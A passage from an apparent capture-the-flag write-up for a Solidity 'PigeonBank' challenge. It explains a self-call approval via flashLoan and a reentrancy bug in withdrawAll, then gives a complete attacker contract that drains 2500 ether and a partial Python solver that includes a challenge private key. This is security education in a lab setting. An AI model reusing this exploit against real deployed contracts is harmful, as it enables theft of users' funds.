</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_wad</span> <span class="o">&lt;=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">,</span> <span class="s">&#34;PETH: wad exceeds balance&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">Address</span><span class="p">.</span><span class="n">isContract</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">),</span> <span class="s">&#34;PETH: Borrower must be a contract&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">userBalanceBefore</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// @dev Send Ether to borrower (Borrower must implement receive() function)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// (bool success, bytes memory returndata) = target.call{value: value}(data);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Address</span><span class="p">.</span><span class="n">functionCallWithValue</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">,</span> <span class="nb">data</span><span class="p">,</span> <span class="n">_wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">userBalanceAfter</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">userBalanceAfter</span> <span class="o">&gt;=</span> <span class="n">userBalanceBefore</span><span class="p">,</span> <span class="s">&#34;PETH: You did not return my Ether!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// @dev if user gave me more Ether, refund it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">userBalanceAfter</span> <span class="o">&gt;</span> <span class="n">userBalanceBefore</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">refund</span> <span class="o">=</span> <span class="n">userBalanceAfter</span> <span class="o">-</span> <span class="n">userBalanceBefore</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">payable</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">).</span><span class="n">sendValue</span><span class="p">(</span><span class="n">refund</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>    
</span></span></code></pre></td></tr></table>
</div>
</div><p>I noticed that we can actually make the <code>PETH</code> contract as the <code>_userAddress</code> param, and then set the <code>_wad</code> value to <code>0</code>. By doing this, we can actually make the <code>PETH</code> contract to call one of their own function (via the <code>Address.functionCallWithValue</code>). Looking for the functions that doesn&rsquo;t have <code>onlyOwner</code> modifier, there is one interesting function, which is <code>approve</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">guy</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">wad</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">allowance</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">guy</span><span class="p">]</span> <span class="o">=</span> <span class="n">wad</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Approval</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">guy</span><span class="p">,</span> <span class="n">wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The idea is that if we call <code>flashLoan</code> and set the <code>_userAddress</code> to <code>PETH</code> contract itself, and then set the <code>calldata</code> to call <code>approve()</code>, we can actually force the <code>PETH</code> to set any allowance to our desired address, so that the desired address can spend the <code>PETH</code> money.</p>
<p>However, notice that <code>PETH</code> doesn&rsquo;t have any money actually. So, we need to look for another bug.</p>
<p>The other bug is actually a reentrancy bug inside the <code>withdrawAll</code> method.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdrawAll</span><span class="p">(</span><span class="kt">address</span> <span class="n">_userAddress</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">).</span><span class="n">sendValue</span><span class="p">(</span><span class="n">balanceOf</span><span class="p">[</span><span class="n">_userAddress</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="n">_burnAll</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// require(success, &#34;SEETH: withdraw failed&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">emit</span> <span class="n">Withdrawal</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">,</span> <span class="n">balanceOf</span><span class="p">[</span><span class="n">_userAddress</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_burnAll</span><span class="p">(</span><span class="kt">address</span> <span class="n">_userAddress</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">_burn</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">,</span> <span class="n">balanceOf</span><span class="p">[</span><span class="n">_userAddress</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There&rsquo;s a problem with this method. It sends the ether to the user before burning the <code>PETH</code> coin. This is vulnerable to reentrancy attack. The scenario is like below:</p>
<ul>
<li>Contract call <code>deposit</code> x ether.</li>
<li>Contract call <code>withdrawAll</code>.</li>
<li>The <code>PETH</code> contract send the ether first.</li>
<li>The contract has <code>receive()</code> method, which will be triggered during receiving value that was being sent by <code>PETH</code>.</li>
<li>The contract call <code>transfer()</code> to send the just received value to <code>PETH</code>.</li>
<li>Now, after this call, the state will be:
<ul>
<li><code>PETH</code> coin&rsquo;s balance is increase by x ether.</li>
<li>Yet, the contract still received x ether.</li>
</ul>
</li>
</ul>
<p>Repeating the above scenario, at some point, the <code>PETH</code> coin&rsquo;s balance will become 2500 ether. And because of the <code>flashLoan</code> that we call before already permit us to spend the <code>PETH</code> coin&rsquo;s balance, we can simply transfer all of <code>PETH</code> coin&rsquo;s balance to us and withdraw it to drain the bank.</p>
<h3 id="full-script-2">Full Script</h3>
<p><strong>Attacker Contract</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./PETH.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./PigeonBank.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attacker</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PETH</span> <span class="n">peth</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PigeonBank</span> <span class="n">bank</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">stopAttack</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_peth</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_bank</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">peth</span> <span class="o">=</span> <span class="n">PETH</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">_peth</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">bank</span> <span class="o">=</span> <span class="n">PigeonBank</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">_bank</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">stopAttack</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setAllowance</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">bank</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">peth</span><span class="p">),</span> <span class="nb">abi</span><span class="p">.</span><span class="n">encodeCall</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">peth</span><span class="p">.</span><span class="n">approve</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">278</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">bank</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">9</span> <span class="kc">ether</span><span class="p">}();</span>
</span></span><span class="line"><span class="cl">            <span class="n">bank</span><span class="p">.</span><span class="n">withdrawAll</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">stopAttack</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">peth</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">peth</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">2500</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">bank</span><span class="p">.</span><span class="n">withdrawAll</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">2500</span> <span class="kc">ether</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Address: unable to send value, recipient may have reverted&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">stopAttack</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">peth</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">peth</span><span class="p">),</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Solver</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">solcx</span> <span class="kn">import</span> <span class="n">compile_files</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;win.the.seetf.sg&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">8550</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">launch_instance</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Launch instance...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid:           &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">uuid</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;rpc endpoint:   &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rpc_endpoint</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;private key:    &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">private_key</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;setup contract: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">setup_address</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;uuid          = </span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;rpc_endpoint  = </span><span class="se">\&#39;</span><span class="si">{</span><span class="n">rpc_endpoint</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;private_key   = </span><span class="se">\&#39;</span><span class="si">{</span><span class="n">private_key</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;setup_address = </span><span class="se">\&#39;</span><span class="si">{</span><span class="n">setup_address</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">uuid</span><span class="p">,</span> <span class="n">rpc_endpoint</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">private_key</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">setup_address</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">kill_instance</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Kill instance...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid please: &#39;</span><span class="p">,</span> <span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Get Flag...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid please: &#39;</span><span class="p">,</span> <span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">readrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Launch instance</span>
</span></span><span class="line"><span class="cl"><span class="n">uuid</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># uuid          = b&#39;0ffdc839-b96f-4208-b6e7-e193af621b2a&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># rpc_endpoint  = &#39;http://win.the.seetf.sg:8549/0ffdc839-b96f-4208-b6e7-e193af621b2a&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># private_key   = &#39;0xcf8daf0d42de5d51e8b32f842810a236f65024a85d02ad2188971a740b9c0c03&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># setup_address = &#39;0x8b75Fad9f3bF4384c545FF4D00789b4b804bFfe8&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">uuid</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">uuid</span><span class="p">,</span> <span class="n">rpc_endpoint</span><span class="p">,</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">setup_address</span> <span class="o">=</span> <span class="n">launch_instance</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Connect to the network</span>
</span></span><span class="line"><span class="cl"><span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="n">rpc_endpoint</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">w3</span><span class="o">.</span><span class="n">is_connected</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">player</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">from_key</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Player address: </span><span class="si">{</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get peth address</span>
